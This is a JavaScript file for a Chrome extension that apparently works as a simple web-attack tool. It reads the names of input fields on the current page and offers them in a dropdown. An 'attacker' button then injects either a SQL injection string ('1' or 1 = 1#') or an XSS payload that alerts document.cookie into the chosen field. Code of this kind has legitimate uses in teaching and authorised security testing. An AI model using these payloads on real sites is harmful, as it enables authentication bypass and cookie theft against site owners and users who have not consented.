/**
 * Get the current URL.
 *
 * @param {function(string)} callback called when the URL of the current tab
 *   is found.
 */

var tab_title = '';

function getCurrentTabUrl(callback) {
    var queryInfo = {
        active: true,
        currentWindow: true
    };

    chrome.tabs.query(queryInfo, (tabs) => {
        var tab = tabs[0];

        var url = tab.url;

        console.assert(typeof url == 'string', 'tab.url should be a string');

        callback(url);
    });
}

chrome.tabs.query({ active: true }, function(tabs) {
    var tab = tabs[0];
    var scriptToExec = `(${getids})()`;
    tab_title = tab.title;
    chrome.tabs.executeScript(tab.id, {
        code: scriptToExec
    }, display_tags);
});

function display_tags(results) {
	console.log(results);
	var sel = document.getElementById("dropdown-input");
    for (var i=0; i<results[0].length; i++) {
		var option = document.createElement("option");
		option.text = results[0][i];
		option.value = results[0][i];
        sel.appendChild(option);
	}
}

function getids() {
    //console.log(url);
    var allElements = document.getElementsByTagName("input");
	var allIds = [];
    for (var i = 0, n = allElements.length; i < n; ++i) {
		var el = allElements[i];
		var name = allElements[i].getAttribute("name");
        if (name) {
            allIds.push(name);
        }
    }
    return allIds;
}

document.addEventListener('DOMContentLoaded', () => {
    getCurrentTabUrl((url) => {
		var dropdown = document.getElementById('dropdown');
		var attackbtn = document.getElementById('attacker');

		attackbtn.addEventListener('click', function(){
			var attacktype = document.getElementById('dropdown').value;
			var attackdest = document.getElementById('dropdown-input').value;

			if(attacktype == "SQL Injection"){
				chrome.tabs.query({ active: true }, function(tabs) {
					var tab = tabs[0];
					var scriptToExec = `(${sqlAttack})(`+ JSON.stringify(attackdest) + `)`;
					tab_title = tab.title;
					chrome.tabs.executeScript(tab.id, {
						code: scriptToExec
					});
				});
			}
			else if (attacktype == "XSS"){
				chrome.tabs.query({ active: true }, function(tabs) {
                    var tab = tabs[0];
                    var script2Exec = `(${performXSS})(` + JSON.stringify(attackdest) + `)`;
                    tab_title = tab.title;
                    chrome.tabs.executeScript(tab.id, {
                        code: script2Exec
                    });
                });
			}
		});
    });
});

function sqlAttack(value){
	document.getElementsByName(value)[0].value = "1' or 1 = 1#";
}

function performXSS(value) {
	document.getElementsByName(value)[0].value = '"<script>alert(document.cookie);</script>';
}
